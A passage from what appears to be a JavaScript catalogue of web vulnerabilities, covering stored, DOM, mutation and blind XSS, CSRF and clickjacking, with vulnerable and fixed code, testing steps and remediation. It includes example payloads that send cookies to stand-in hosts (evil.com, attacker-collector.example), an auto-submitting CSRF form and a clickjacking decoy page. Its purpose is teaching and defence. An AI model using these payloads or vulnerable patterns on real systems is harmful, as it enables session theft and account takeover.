      "https://portswigger.net/web-security/cross-site-scripting/reflected"
    ],
    difficulty: "Easy",
    commonness: "Very Common"
  },

  {
    id: "xss-stored",
    name: "Stored (Persistent) Cross-Site Scripting",
    category: "XSS",
    cwe: "CWE-79",
    owasp_category: "A03:2021 - Injection",
    description:
      "Stored XSS occurs when an attacker's script payload is saved server-side (in a " +
      "database, file, or other persistent store) and later served to other users -- " +
      "typically via user-generated content features like comments, profile fields, product " +
      "reviews, forum posts, support tickets, or file metadata -- without proper output " +
      "encoding at render time. Unlike reflected XSS, no crafted link needs to be delivered " +
      "to the victim; simply viewing the page containing the stored payload is sufficient to " +
      "trigger execution, which makes stored XSS significantly more dangerous since it can " +
      "silently affect every visitor, including administrators.\n\n" +
      "A stored payload placed in an admin-visible area (a support ticket subject line, a " +
      "flagged username, a file upload's metadata shown in an admin dashboard) is a " +
      "particularly high-value target because it can be used to steal an administrator's " +
      "session and pivot to full application compromise the moment any admin views the " +
      "affected page.",
    impact:
      "Mass session hijacking of every user who views the infected page/content; " +
      "administrator account compromise if the payload reaches an admin-only view, often " +
      "leading to full application takeover; worm-like self-propagation if the payload can " +
      "write further stored payloads (as seen historically in the Samy MySpace worm); " +
      "persistent defacement and credential phishing at scale.",
    examples: [
      {
        title: "Node.js/Express comment system storing and rendering raw HTML",
        vulnerable_code:
          "app.post('/comments', async (req, res) => {\n" +
          "  await db.comments.insert({ author: req.session.user, body: req.body.comment });\n" +
          "  res.redirect('/post/' + req.body.postId);\n" +
          "});\n\n" +
          "// Template (EJS, unescaped output):\n" +
          "// <div class=\"comment\"><%- comment.body %></div>",
        fixed_code:
          "const sanitizeHtml = require('sanitize-html');\n\n" +
          "app.post('/comments', async (req, res) => {\n" +
          "  const clean = sanitizeHtml(req.body.comment, {\n" +
          "    allowedTags: ['b', 'i', 'em', 'strong', 'a'],\n" +
          "    allowedAttributes: { a: ['href'] }\n" +
          "  });\n" +
          "  await db.comments.insert({ author: req.session.user, body: clean });\n" +
          "  res.redirect('/post/' + req.body.postId);\n" +
          "});\n\n" +
          "// Template (EJS, escaped output for any remaining plain text):\n" +
          "// <div class=\"comment\"><%- comment.body %></div>\n" +
          "// (safe here ONLY because comment.body was already sanitized on write)",
        explanation:
          "The EJS <%- %> tag outputs raw, unescaped HTML by design; combined with storing " +
          "the comment body verbatim, any user submitting " +
          "<script>fetch('//evil.com/c?'+document.cookie)</script> as a comment causes that " +
          "script to execute in the browser of every subsequent visitor to that post, " +
          "including moderators reviewing flagged comments. The fix sanitizes the HTML on " +
          "write using an allowlist-based sanitizer (sanitize-html) that strips <script> " +
          "tags and dangerous attributes (onerror, onload) while permitting a small set of " +
          "safe formatting tags, so the stored value can never contain executable script " +
          "regardless of how it is later rendered."
      }
    ],
    detection_methods: [
      "Submit unique canary XSS payloads through every user-generated content field (comments, profile bio, filenames, support tickets, product reviews)",
      "Revisit the page (and any admin/moderation views that might display the same data) to check whether the payload executes or appears unescaped",
      "Pay special attention to fields displayed in admin dashboards, email notifications rendered as HTML, and export/report features, which are common blind spots"
    ],
    tools: ["Burp Suite (manual + Collaborator for blind confirmation)", "XSS Hunter / XSS Hunter Express (for blind stored XSS against admin views)", "OWASP ZAP"],
    automated_testing:
      "Generic scanners struggle with true stored XSS because the injection point (the " +
      "submission form) and the execution point (a rendered page, possibly admin-only) are " +
      "different requests; XSS Hunter-style blind payloads that beacon back to an " +
      "attacker-controlled collector when they execute anywhere are the most reliable " +
      "automated approach for admin-facing surfaces you cannot directly browse to as a " +
      "tester.",
    manual_testing: [
      "Enumerate every feature that persists user input for later display to other users or roles",
      "Submit distinct canary payloads per field so you can trace which specific field triggered execution",
      "Revisit the content as multiple user roles if possible (regular user, moderator, admin) since rendering/encoding can differ by view",
      "Check secondary render surfaces beyond the obvious page: email digests, PDF/CSV exports, RSS feeds, search result snippets, admin audit logs",
      "For suspected admin-only execution, use an out-of-band beacon payload (XSS Hunter) rather than alert() so you get proof of execution without direct access to the admin view"
    ],
    remediation:
      "Sanitize rich-text/HTML input on the way in using a vetted allowlist-based sanitizer " +
      "(DOMPurify client-side, sanitize-html or the OWASP Java HTML Sanitizer server-side), " +
      "and additionally apply context-aware output encoding at every render location -- " +
      "defense-in-depth matters because a single sanitization bypass elsewhere should not be " +
      "the only barrier. Never use raw/unescaped output tags (EJS <%- %>, Vue v-html, " +
      "dangerouslySetInnerHTML) for user-generated content unless it has passed through " +
      "sanitization immediately beforehand. Set HttpOnly and Secure flags on session cookies " +
      "so stolen-cookie exfiltration via document.cookie is not possible even if XSS occurs, " +
      "and deploy a strict CSP as an additional layer.",
    references: [
      "https://owasp.org/www-community/attacks/xss/Stored_XSS",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
      "https://portswigger.net/web-security/cross-site-scripting/stored"
    ],
    difficulty: "Easy",
    commonness: "Very Common"
  },

  {
    id: "xss-dom",
    name: "DOM-Based Cross-Site Scripting",
    category: "XSS",
    cwe: "CWE-79",
    owasp_category: "A03:2021 - Injection",
    description:
      "DOM-based XSS occurs entirely on the client side: JavaScript already running in the " +
      "page reads attacker-controllable data from a 'source' (location.hash, " +
      "location.search, document.referrer, window.name, postMessage data, localStorage) and " +
      "writes it into a dangerous 'sink' (innerHTML, document.write, eval, " +
      "setAttribute('href', ...), jQuery's $() when given an HTML string) without " +
      "sanitization. Critically, the payload may never touch the server at all -- " +
      "traditional server-side output encoding and even server-side WAFs are completely " +
      "blind to this class since the vulnerable data flow exists purely within client-side " +
      "JavaScript.\n\n" +
      "This makes DOM XSS both harder to find with black-box HTTP-only tooling and " +
      "increasingly common as applications shift more rendering logic into client-side " +
      "JavaScript frameworks and single-page apps. A common real-world example is a client " +
      "router reading a #fragment from the URL and using it to build a deep-link redirect or " +
      "content lookup via innerHTML without escaping.",
    impact:
      "Full script execution in the victim's browser session identical in impact to " +
      "reflected/stored XSS (session/token theft, account takeover, phishing overlays); " +
      "because the source is often the URL fragment (which is never sent to the server), " +
      "these payloads can also evade server-side logging and WAF inspection entirely.",
    examples: [
      {
        title: "Vanilla JS single-page app rendering a URL fragment via innerHTML",
        vulnerable_code:
          "// page.js\n" +
          "function renderWelcomeBanner() {\n" +
          "  const name = decodeURIComponent(location.hash.substring(1));\n" +
          "  document.getElementById('banner').innerHTML = `Welcome back, ${name}!`;\n" +
          "}\n" +
          "window.addEventListener('hashchange', renderWelcomeBanner);\n" +
          "renderWelcomeBanner();",
        fixed_code:
          "// page.js\n" +
          "function renderWelcomeBanner() {\n" +
          "  const name = decodeURIComponent(location.hash.substring(1));\n" +
          "  const banner = document.getElementById('banner');\n" +
          "  banner.textContent = ''; // clear\n" +
          "  banner.append('Welcome back, ', name, '!'); // text nodes, never parsed as HTML\n" +
          "}\n" +
          "window.addEventListener('hashchange', renderWelcomeBanner);\n" +
          "renderWelcomeBanner();",
        explanation:
          "Navigating to https://target/page#<img src=x onerror=alert(document.domain)> " +
          "puts that string into location.hash; since the fragment is never sent to the " +
          "server, no server-side control ever sees this payload, and the client-side " +
          "innerHTML assignment parses it as HTML, executing the injected onerror handler. " +
          "The fix uses textContent and the DOM append() API with plain string arguments, " +
          "which are always inserted as literal text nodes and can never be interpreted as " +
          "markup, regardless of content."
      },
      {
        title: "jQuery selector sink processing an untrusted URL fragment",
        vulnerable_code:
          "$(function () {\n" +
          "  var target = decodeURIComponent(location.hash.substring(1));\n" +
          "  $('#content').html(target); // $.fn.html() parses and injects raw HTML\n" +
          "});",
        fixed_code:
          "$(function () {\n" +
          "  var target = decodeURIComponent(location.hash.substring(1));\n" +
          "  $('#content').text(target); // $.fn.text() always treats input as plain text\n" +
          "});",
        explanation:
          "jQuery's .html() sink behaves like innerHTML and will parse and execute markup " +
          "passed to it, so the same fragment-based payload achieves script execution. " +
          "Switching to .text() guarantees the string is inserted as plain text, never " +
          "parsed as HTML, closing the sink."
      }
    ],
    detection_methods: [
      "Use static analysis / grep for dangerous sinks (innerHTML, outerHTML, document.write, eval, Function(), setTimeout(string), jQuery .html()) and trace backward to their data source",
      "Use dynamic taint-tracking browser tooling (DOM Invader in Burp Suite) to automatically flag source-to-sink flows during normal browsing",
      "Manually test every client-side-only input surface: URL fragment, postMessage listeners, window.name, localStorage/sessionStorage values, document.referrer"
    ],
    tools: ["Burp Suite DOM Invader", "DOMPurify (for verifying safe sanitization)", "Chrome DevTools (Sources panel breakpoints on innerHTML/eval)", "ESLint no-unsanitized plugin (static analysis)"],
    automated_testing:
      "Burp Suite's DOM Invader (built into Burp's embedded browser) instruments the page " +
      "at runtime to automatically flag exploitable source-to-sink flows including through " +
      "postMessage and web workers, and can auto-generate canary-based PoC URLs; this is " +
      "significantly more reliable for DOM XSS than passive/active HTTP-only scanners since " +
      "it observes actual client-side execution.",
    manual_testing: [
      "Search page JavaScript (including bundled/minified code, using source maps or beautifiers) for known dangerous sinks",
      "For each sink found, trace the data flow backward to determine if it originates from an attacker-controllable source",
      "Test each identified source with a canary payload appropriate to the sink (HTML injection for innerHTML, JS injection for eval)",
      "Pay special attention to postMessage handlers that do not validate event.origin, and to client-side routers reading URL fragments/query strings",
      "Confirm execution in an actual browser session, since source maps and static review alone can produce false positives if intervening logic sanitizes the value"
    ],
    remediation:
      "Avoid dangerous DOM sinks entirely where possible: use textContent/innerText instead " +
      "of innerHTML, avoid eval()/Function()/setTimeout with string arguments, and use " +
      "jQuery's .text() rather than .html() for untrusted data. Where raw HTML insertion is " +
      "a genuine requirement (rich text rendering), pass the content through DOMPurify " +
      "immediately before assignment. Validate event.origin in every postMessage listener. " +
      "Adopt a strict Content-Security-Policy with script-src restrictions and, ideally, " +
      "Trusted Types (supported in Chromium-based browsers) to enforce at the platform level " +
      "that raw strings cannot be assigned to dangerous sinks without passing through a " +
      "vetted policy function.",
    references: [
      "https://owasp.org/www-community/attacks/DOM_Based_XSS",
      "https://portswigger.net/web-security/cross-site-scripting/dom-based",
      "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"
    ],
    difficulty: "Medium",
    commonness: "Very Common"
  },

  {
    id: "xss-mutation",
    name: "Mutation Cross-Site Scripting (mXSS)",
    category: "XSS",
    cwe: "CWE-79",
    owasp_category: "A03:2021 - Injection",
    description:
      "Mutation XSS exploits discrepancies between how a sanitizer parses HTML and how the " +
      "browser's actual HTML parser (and its subsequent DOM serialization/re-parsing steps) " +
      "interprets the same markup. A payload that looks completely inert when the sanitizer " +
      "inspects it can 'mutate' into an executable form once the browser writes it to " +
      "innerHTML and the DOM is serialized and re-parsed -- for example due to differences in " +
      "how namespace-confused SVG/MathML content, malformed attribute quoting, or " +
      "HTML-in-HTML nesting are normalized by the browser's parser versus the sanitizer's " +
      "internal model.\n\n" +
      "mXSS is notably harder to defend against than ordinary stored/reflected XSS because " +
      "the sanitizer itself can be technically correct about the HTML it was given, yet the " +
      "browser's parsing/serialization round-trip introduces new, dangerous markup that " +
      "did not exist in the original sanitized string. Several real-world mXSS bypasses have " +
      "been published against early DOMPurify and other sanitizer implementations, most " +
      "prominently research by Mario Heiderich demonstrating that innerHTML round-tripping " +
      "(read a sanitized string back via innerHTML, then reassign it, common in rich-text " +
      "editors) can reintroduce executable markup.",
    impact:
      "Bypasses HTML sanitization entirely, defeating a control specifically deployed to " +
      "prevent XSS; same ultimate impact as any other XSS (session hijacking, account " +
      "takeover) but notably harder to detect via code review since the sanitizer's output " +
      "looks safe in isolation.",
    examples: [
      {
        title: "Rich text editor performing an innerHTML round-trip on sanitized content",
        vulnerable_code:
          "function saveContent(editorEl) {\n" +
          "  const clean = DOMPurify.sanitize(editorEl.innerHTML);\n" +
          "  // BUG: re-assigning back into the live DOM for a \"preview\" causes\n" +
          "  // the browser to re-parse/mutate the already-sanitized markup\n" +
          "  document.getElementById('preview').innerHTML = clean;\n" +
          "  saveToServer(clean);\n" +
          "}",
        fixed_code:
          "function saveContent(editorEl) {\n" +
          "  // Sanitize immediately before EVERY assignment into the DOM, never trust\n" +
          "  // a previously-sanitized string to still be safe after further processing\n" +
          "  const rawFromEditor = editorEl.innerHTML;\n" +
          "  const cleanForPreview = DOMPurify.sanitize(rawFromEditor);\n" +
          "  document.getElementById('preview').innerHTML = cleanForPreview;\n" +
          "  const cleanForStorage = DOMPurify.sanitize(rawFromEditor, { USE_PROFILES: { html: true } });\n" +
          "  saveToServer(cleanForStorage);\n" +
          "  // Keep DOMPurify at the latest version -- mXSS fixes are shipped as\n" +
          "  // parser-differential bugs are discovered and patched upstream.\n" +
          "}",
        explanation:
          "Historical mXSS research showed that certain nested/malformed markup (e.g. " +
          "involving <style>, <noscript>, or SVG/foreignObject namespace confusion) can pass " +
          "through a sanitizer as inert text, but once written to innerHTML and the browser's " +
          "parser normalizes the DOM tree, the serialized result differs from the original " +
          "sanitized string in a way that reintroduces an executable element. Practically, " +
          "the fix is less about a single code change and more about discipline: sanitize " +
          "immediately before every DOM write (never reuse a value that has been through any " +
          "additional processing step since sanitization), and keep the sanitizer library " +
          "current, since DOMPurify actively patches newly discovered mXSS parser-differential " +
          "bugs."
      }
    ],
    detection_methods: [
      "Test known mXSS payload patterns (SVG/MathML namespace confusion, malformed nested tags, style/noscript-based mutations) against the specific sanitizer version in use",
      "Fuzz the sanitizer with a differential testing harness that compares sanitizer output against actual browser DOM re-parsing results",
      "Check the sanitizer library's changelog/CVE history for known mXSS bypasses relevant to the deployed version"
    ],
    tools: ["DOMPurify's own test suite (for whitebox verification)", "mXSS-specific payload collections (PortSwigger research payloads)", "Burp Suite DOM Invader"],
    automated_testing:
      "There is no single automated mXSS scanner; the most reliable approach is running " +
      "curated mXSS payload sets (published by sanitizer researchers) against the live " +
      "application in a real browser and checking actual DOM execution, since the bug class " +
      "is fundamentally about the gap between static analysis and live browser parsing " +
      "behavior.",
    manual_testing: [
      "Identify the exact HTML sanitizer library and version in use (client-side and/or server-side)",
      "Cross-reference known published mXSS bypasses for that specific library/version",
      "Test candidate payloads directly in the target application, confirming execution in an actual rendered browser page rather than only inspecting sanitizer output",
      "Pay special attention to any feature that re-processes already-sanitized content (round-trip through innerHTML, re-sanitizing previously sanitized data, copy-paste rich text editors)"
    ],
    remediation:
      "Keep sanitizer libraries (DOMPurify, sanitize-html, ammonia) updated to the latest " +
      "version at all times, since mXSS fixes are released reactively as parser-differential " +
      "bugs are discovered. Sanitize immediately before each DOM write rather than storing " +
      "and reusing a previously sanitized value across multiple processing steps. Where " +
      "supported, enable DOMPurify's SAFE_FOR_TEMPLATES and stricter parsing profiles, and " +
      "layer a strict CSP (with Trusted Types where browser support allows) so that even a " +
      "successful mXSS bypass has a reduced blast radius.",
    references: [
      "https://cure53.de/fp170.pdf",
      "https://github.com/cure53/DOMPurify/wiki/Security-Advisories",
      "https://portswigger.net/web-security/cross-site-scripting"
    ],
    difficulty: "Hard",
    commonness: "Rare"
  },

  {
    id: "xss-blind",
    name: "Blind Cross-Site Scripting",
    category: "XSS",
    cwe: "CWE-79",
    owasp_category: "A03:2021 - Injection",
    description:
      "Blind XSS is a stored XSS variant where the payload is submitted through a surface " +
      "the tester cannot directly view -- most commonly data that only appears in an " +
      "internal admin dashboard, a backend support/ticketing system, a log viewer, a CRM, or " +
      "an internal analytics tool. The tester has no visibility into whether or when the " +
      "payload executes, so exploitation and detection rely on an out-of-band callback: the " +
      "injected script, when it eventually renders in front of a privileged internal user, " +
      "beacons back to an attacker/tester-controlled collector server with details of the " +
      "execution context (cookies, URL, DOM snapshot, screenshot).\n\n" +
      "Classic blind XSS injection points include contact-form submissions (viewed later in a " +
      "CRM), 'Report abuse' or feedback fields (viewed in a moderation queue), User-Agent and " +
      "Referer headers (parsed into an internal analytics dashboard), file upload metadata, " +
      "and order/shipping notes (viewed by fulfillment staff). Because the victim is often an " +
      "internal employee or administrator with elevated privileges, successful blind XSS is " +
      "frequently higher-impact than ordinary stored XSS despite being harder to prove.",
    impact:
      "Compromise of internal administrative or support-staff sessions, often with far " +
      "greater privileges than any externally reachable account; pivot point into internal " +
      "tooling (CRMs, admin panels, log viewers) that may not be internet-facing and " +
      "therefore have weaker security hardening; can lead to full platform compromise if the " +
      "compromised internal tool has broad administrative capability.",
    examples: [
      {
        title: "Support ticket system rendering the User-Agent header unescaped in an internal admin view",
        vulnerable_code:
          "// Ticket creation endpoint\n" +
          "app.post('/support/ticket', (req, res) => {\n" +
          "  db.tickets.insert({\n" +
          "    subject: req.body.subject,\n" +
          "    userAgent: req.headers['user-agent'], // stored verbatim\n" +
          "    body: req.body.message\n" +
          "  });\n" +
          "  res.send('Ticket submitted');\n" +
          "});\n\n" +
          "// Internal admin ticket view (EJS template)\n" +
          "// <p>Browser: <%- ticket.userAgent %></p>",
        fixed_code:
          "app.post('/support/ticket', (req, res) => {\n" +
          "  db.tickets.insert({\n" +
          "    subject: req.body.subject,\n" +
          "    userAgent: req.headers['user-agent'],\n" +
          "    body: req.body.message\n" +
          "  });\n" +
          "  res.send('Ticket submitted');\n" +
          "});\n\n" +
          "// Internal admin ticket view (EJS template, escaped output)\n" +
          "// <p>Browser: <%= ticket.userAgent %></p>",
        explanation:
          "An attacker submits a support ticket with a crafted User-Agent header such as " +
          "<script src=https://attacker-collector.example/x.js></script>. It renders " +
          "harmlessly in the public confirmation page but executes the moment a support " +
          "agent opens the ticket in the internal admin dashboard, which uses <%- %> " +
          "(unescaped output) to render it -- silently exfiltrating the agent's session " +
          "cookie to the attacker's collector. The fix is a single-character change from " +
          "<%- %> to <%= %>, switching EJS from raw HTML output to auto-escaped output for " +
          "every field displayed in the internal view, including headers and other " +
          "'unlikely' injection points that developers often assume are safe because they " +
          "are not directly user-facing on the public site."
      }
    ],
    detection_methods: [
      "Inject out-of-band beacon payloads (XSS Hunter Express, Burp Collaborator-backed script tags) into every field that might be viewed by an internal/back-office system, not just publicly rendered pages",
      "Include headers (User-Agent, Referer, X-Forwarded-For) in the injection surface, since internal analytics/log viewers frequently render these unsanitized",
      "Wait and monitor the collector for callbacks over an extended window (blind payloads may only fire when an admin happens to review the relevant queue, sometimes days later)"
    ],
    tools: ["XSS Hunter Express (self-hosted)", "Burp Suite Collaborator", "Interactsh"],
    automated_testing:
      "Deploy an XSS Hunter Express instance (or use Burp Collaborator payloads generated " +
      "via Burp's context menu) and systematically replace every 'normal' XSS test payload " +
      "across the entire engagement with the beacon-generating equivalent, so that any blind " +
      "execution anywhere in the target's internal tooling reports back automatically with " +
      "cookies, screenshot, and DOM dump, without requiring the tester to have visibility " +
      "into where the payload actually renders.",
    manual_testing: [
      "Identify every field that could plausibly be viewed by internal staff separate from the public-facing application: support tickets, contact forms, abuse reports, order notes, file metadata, HTTP headers logged to internal dashboards",
      "Replace standard alert()-style PoC payloads with an out-of-band beacon script tag pointing at a collector you control",
      "Submit unique, per-field beacon payloads so that any callback can be traced back to the specific injection point",
      "Monitor the collector across the full engagement window, since internal review cadence varies widely by organization",
      "On callback, review the captured context (cookies, screenshot, URL) to assess actual impact and privilege level of the affected internal user"
    ],
    remediation:
      "Apply the exact same context-aware output encoding discipline to internal/back-office " +
      "views as to public-facing pages -- internal tools are not a trusted-input zone simply " +
      "because they are not internet-facing, since the data they render still originates from " +
      "untrusted external users. Audit every field rendered in admin dashboards, CRMs, log " +
      "viewers, and analytics tools for unescaped output, paying particular attention to " +
      "HTTP headers and metadata fields that are easy to overlook as 'internal only' data.",
    references: [
      "https://xsshunter.com/",
      "https://owasp.org/www-community/attacks/xss/Stored_XSS",
      "https://portswigger.net/web-security/cross-site-scripting"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  // ===========================================================================
  // CSRF / CLICKJACKING
  // ===========================================================================

  {
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    category: "Authentication",
    cwe: "CWE-352",
    owasp_category: "A01:2021 - Broken Access Control",
    description:
      "CSRF tricks an authenticated victim's browser into submitting an unwanted, " +
      "state-changing request to a target application on which the victim is currently " +
      "logged in, exploiting the browser's automatic inclusion of ambient credentials " +
      "(session cookies) with every request regardless of which site initiated it. Because " +
      "the browser attaches the victim's cookies automatically, a malicious page hosted " +
      "anywhere on the internet can trigger a cross-origin form submission or fetch request " +
      "that the target server cannot distinguish from a legitimate, user-initiated action, " +
      "unless the application has explicit anti-CSRF protections in place.\n\n" +
      "Modern browsers' SameSite cookie attribute (Lax by default since Chrome 80) has " +
      "significantly reduced CSRF risk for simple cross-site navigations, but GET-based " +
      "state-changing endpoints, subdomains sharing a cookie scope, SameSite=None cookies " +
      "(required for legitimate cross-site embedding scenarios), and applications that have " +
      "not explicitly set SameSite remain vulnerable. CSRF is fundamentally an authorization " +
      "problem: the request is technically valid and authenticated, but its origin/intent was " +
      "never verified.",
    impact:
      "Unauthorized state changes performed as the victim: changing account email/password " +
      "(leading to full account takeover), making unauthorized financial transfers, " +
      "modifying security settings (disabling 2FA, adding an attacker-controlled SSH key or " +
      "API token), posting content, or deleting data -- all executed silently with the " +
      "victim's full authenticated privileges.",
    examples: [
      {
        title: "Express.js email-change endpoint with no CSRF protection",
        vulnerable_code:
          "app.post('/account/email', requireAuth, async (req, res) => {\n" +
          "  await db.users.update(\n" +
          "    { id: req.session.userId },\n" +
          "    { email: req.body.newEmail }\n" +
          "  );\n" +
          "  res.send('Email updated');\n" +
          "});\n" +
          "// cookie: connect.sid issued without SameSite attribute set",
        fixed_code:
          "const csrf = require('csurf');\n" +
          "const csrfProtection = csrf({ cookie: false }); // token stored in session\n\n" +
          "app.use(session({\n" +
          "  secret: process.env.SESSION_SECRET,\n" +
          "  cookie: { sameSite: 'lax', secure: true, httpOnly: true }\n" +
          "}));\n\n" +
          "app.post('/account/email', requireAuth, csrfProtection, async (req, res) => {\n" +
          "  await db.users.update(\n" +
          "    { id: req.session.userId },\n" +
          "    { email: req.body.newEmail }\n" +
          "  );\n" +
          "  res.send('Email updated');\n" +
          "});",
        explanation:
          "An attacker hosts a page with an auto-submitting form: " +
          "<form action=\"https://target/account/email\" method=\"POST\">" +
          "<input name=\"newEmail\" value=\"attacker@evil.com\"></form><script>document." +
          "forms[0].submit()</script>. If the victim (already logged into target) visits " +
          "the attacker's page, their browser submits the form with their session cookie " +
          "automatically attached, changing their account email to one the attacker " +
          "controls -- from which they can then trigger a password reset to fully take over " +
          "the account. The fix adds a synchronizer CSRF token (validated server-side on " +
          "every state-changing request) and sets the session cookie's SameSite attribute " +
          "to Lax, both of which independently block the forged cross-site submission."
      }
    ],
    detection_methods: [
      "Identify all state-changing endpoints (POST/PUT/PATCH/DELETE, and any GET that changes state, which is itself an anti-pattern) and check whether they validate a CSRF token or rely solely on cookies",
      "Check the Set-Cookie header for the session cookie's SameSite attribute (missing or SameSite=None without a token-based control is high risk)",
      "Build a standalone HTML PoC page with an auto-submitting form/fetch targeting the endpoint and test whether it succeeds when loaded from a different origin while authenticated",
      "Test whether an existing CSRF token can be omitted entirely, reused across sessions, or swapped for another user's token (broken validation)"
    ],
    tools: ["Burp Suite (Generate CSRF PoC feature)", "OWASP ZAP", "manual HTML PoC pages"],
    automated_testing:
      "Burp Suite's 'Engagement tools > Generate CSRF PoC' auto-builds a working HTML PoC " +
      "form from any captured request, which you can open in a browser session " +
      "authenticated to the target to confirm exploitability directly; OWASP ZAP's passive " +
      "scanner flags forms lacking a recognizable anti-CSRF token pattern as a starting " +
      "point for manual verification.",
    manual_testing: [
      "Capture a legitimate state-changing request while authenticated",
      "Remove the CSRF token parameter/header entirely and resend; if it still succeeds, the endpoint is unprotected",
      "If a token is present, test whether it is actually validated: submit a request with another user's valid token, an empty token, or a token from a different session",
      "Build a minimal standalone HTML file with an auto-submitting form or fetch() targeting the vulnerable endpoint, and load it in a browser logged into the target from a separate, unrelated origin",
      "Check the SameSite attribute on the session cookie via browser DevTools; combine with the above tests to determine actual real-world exploitability given current browser defaults",
      "Test GET-based state-changing endpoints specifically, since these can be triggered via a simple <img src=...> tag with no user interaction and are not mitigated by SameSite=Lax for top-level navigation in the same way POST forms are"
    ],
    remediation:
      "Implement synchronizer CSRF tokens (a unique, unpredictable, per-session or per-request " +
      "token embedded in every state-changing form/request and validated server-side before " +
      "processing) using a framework-provided library rather than a custom implementation. Set " +
      "SameSite=Lax (or Strict where feasible) on session cookies as a strong complementary " +
      "layer. Never perform state changes via GET requests. For APIs consumed by JavaScript, " +
      "consider double-submit cookie patterns or requiring a custom header " +
      "(X-Requested-With) that simple cross-site form submissions cannot set, combined with " +
      "verifying the Origin/Referer header on state-changing requests as defense-in-depth.",
    references: [
      "https://owasp.org/www-community/attacks/csrf",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
      "https://portswigger.net/web-security/csrf"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  {
    id: "clickjacking",
    name: "Clickjacking (UI Redressing)",
    category: "Access Control",
    cwe: "CWE-1021",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "Clickjacking tricks a victim into clicking on something different from what they " +
      "perceive, by loading the target application inside a transparent or visually " +
      "disguised <iframe> layered underneath attacker-controlled content. The victim believes " +
      "they are interacting with the attacker's decoy page (a game, a 'claim your prize' " +
      "button), but their click actually lands on a precisely positioned, invisible element " +
      "of the framed target application, triggering a real action (a purchase, a permission " +
      "grant, an account setting change) without their knowledge.\n\n" +
      "This attack requires no XSS or code execution vulnerability in the target -- it purely " +
      "exploits the absence of framing protections. Variants include cursorjacking (spoofing " +
      "the visual cursor position) and likejacking (historically used to trick users into " +
      "clicking hidden social media 'Like' buttons). Any page performing a sensitive, " +
      "single-click action (enable webcam/mic permissions, one-click purchase, delete " +
      "account, change privacy settings) is a prime clickjacking target if it can be framed.",
    impact:
      "Unauthorized execution of sensitive single-click actions on behalf of the victim " +
      "(enabling account settings, authorizing OAuth grants, making purchases, changing " +
      "privacy controls); when combined with drag-and-drop interactions, can be used to " +
      "exfiltrate data the victim did not intend to share.",
    examples: [
      {
        title: "Application missing frame-busting headers, allowing invisible iframe overlay",
        vulnerable_code:
          "// Server response headers (vulnerable):\n" +
          "// HTTP/1.1 200 OK\n" +
          "// Content-Type: text/html\n" +
          "// (no X-Frame-Options or frame-ancestors CSP directive present)\n\n" +
          "<!-- attacker.com/decoy.html -->\n" +
          "<style>\n" +
          "  iframe { opacity: 0.001; position: absolute; top: 250px; left: 400px; width: 150px; height: 40px; }\n" +
          "  .decoy-button { position: absolute; top: 250px; left: 400px; }\n" +
          "</style>\n" +
          "<div class=\"decoy-button\">Click here to win a prize!</div>\n" +
          "<iframe src=\"https://target.example/account/delete-confirm\"></iframe>",
        fixed_code:
          "// Server response headers (fixed):\n" +
          "// X-Frame-Options: DENY\n" +
          "// Content-Security-Policy: frame-ancestors 'none'\n\n" +
          "// Express.js example using the helmet middleware:\n" +
          "const helmet = require('helmet');\n" +
          "app.use(helmet.frameguard({ action: 'deny' }));\n" +
          "app.use(\n" +
          "  helmet.contentSecurityPolicy({\n" +
          "    directives: { frameAncestors: [\"'none'\"] }\n" +
          "  })\n" +
          ");",
        explanation:
          "Because the target page sends no X-Frame-Options or CSP frame-ancestors " +
          "directive, the browser permits it to be embedded in any third-party iframe; the " +
          "attacker positions the invisible iframe's delete-confirmation button exactly under " +
          "a decoy 'win a prize' button, so the victim's click both appears to interact with " +
          "the decoy and silently submits the real delete-account confirmation. Setting " +
          "X-Frame-Options: DENY (legacy but broadly supported) and the modern equivalent CSP " +
          "frame-ancestors 'none' directive instructs the browser to refuse to render the " +
          "page inside any frame at all, eliminating the attack surface entirely."
      }
    ],
    detection_methods: [
      "Check response headers for the presence and correctness of X-Frame-Options and/or Content-Security-Policy frame-ancestors on all sensitive pages",
      "Build a minimal test HTML page that iframes the target and visually inspect whether it renders (indicating no protection)",
      "Specifically test sensitive single-action pages (payment confirmation, permission grants, account deletion, OAuth consent screens) since these are the highest-value clickjacking targets"
    ],
    tools: ["Burp Suite (passive scanner flags missing frame protection headers)", "manual iframe PoC pages", "browser DevTools"],
    automated_testing:
      "Burp Suite's passive scanner and most header-analysis tools (securityheaders.com, " +
      "Mozilla Observatory) flag missing X-Frame-Options/frame-ancestors automatically across " +
      "every crawled page; treat this as a starting checklist and manually verify actual " +
      "framability (some environments set the header only on certain routes) with a real " +
      "iframe PoC.",
    manual_testing: [
      "Fetch response headers for every sensitive page and check for X-Frame-Options or CSP frame-ancestors",
      "Build a local HTML file with <iframe src=\"https://target/sensitive-page\"></iframe> and open it in a browser while authenticated to the target",
      "If the target renders inside the iframe, overlay a decoy UI element precisely positioned over the sensitive action and demonstrate that a click on the decoy triggers the real action",
      "Test whether frame-busting is implemented only via client-side JavaScript (easily bypassed by sandboxing the iframe with the allow-scripts attribute omitted, or via the iframe's sandbox attribute stripping the busting script's ability to break out)"
    ],
    remediation:
      "Send Content-Security-Policy: frame-ancestors 'none' (or 'self'/an explicit allowlist " +
      "if legitimate framing is required) on every page, especially sensitive/state-changing " +
      "ones; this is the modern, CSP Level 2+ standard and overrides X-Frame-Options where " +
      "both are present. Also send X-Frame-Options: DENY or SAMEORIGIN as a fallback for " +
      "older browsers that do not support the CSP directive. Do not rely on client-side " +
      "JavaScript frame-busting alone, as it can be neutralized by the attacker's iframe " +
      "sandbox attributes.",
    references: [
      "https://owasp.org/www-community/attacks/Clickjacking",
      "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  // ===========================================================================
  // SERVER-SIDE REQUEST FORGERY
  // ===========================================================================

  {
    id: "ssrf-basic",
    name: "Server-Side Request Forgery (Basic / Direct)",
    category: "Access Control",
    cwe: "CWE-918",
    owasp_category: "A10:2021 - Server-Side Request Forgery",
    description:
